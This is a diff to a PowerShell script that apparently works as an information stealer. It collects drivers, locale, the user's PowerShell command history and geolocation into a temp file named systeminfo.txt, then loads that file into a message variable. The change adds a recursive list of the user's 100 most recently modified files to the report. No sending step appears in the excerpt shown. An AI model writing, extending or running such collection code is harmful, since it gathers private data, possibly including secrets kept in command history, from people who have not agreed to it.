@@ -45,6 +45,7 @@ $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $nu
 $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
 $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
+$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
 
 Add-Type -AssemblyName System.Device;$Geolocate = New-Object System.Device.Location.GeoCoordinateWatcher;$Geolocate.Start()
 while (($Geolocate.Status -ne 'Ready') -and ($Geolocate.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100}  
@@ -111,6 +112,8 @@ $outpath = "$env:temp\systeminfo.txt"
 "Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Recent Files `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($RecentFiles | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 
 $Pathsys = "$env:temp\systeminfo.txt"
 $msgsys = Get-Content -Path $Pathsys -Raw
